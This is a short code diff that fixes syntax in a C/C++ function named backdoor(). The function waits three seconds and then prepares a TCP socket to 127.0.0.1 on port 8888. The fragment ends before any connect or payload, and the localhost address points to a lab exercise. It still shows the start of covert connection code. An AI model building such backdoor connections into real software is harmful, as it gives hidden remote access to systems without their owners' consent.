@@ -22,15 +22,14 @@ int main()
 
 void backdoor()
 {
-    // sleep(3);
-    wait(3);
+    sleep(3);
 
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
     sockaddr_in addr{};
 
     addr.sin_family = AF_INET;
     addr.sin_port = htons(8888);
-    addr.sin_addr..s_addr = inet_addr("127.0.0.1");
+    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
     
     
     
